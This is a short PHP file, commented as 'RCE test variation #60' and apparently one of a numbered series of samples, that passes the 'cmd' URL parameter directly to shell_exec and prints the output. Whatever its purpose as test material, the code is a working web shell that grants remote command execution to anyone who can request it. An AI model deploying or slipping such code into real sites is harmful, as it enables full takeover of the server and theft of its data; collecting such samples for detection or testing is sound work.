<?php
// RCE test variation #60
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>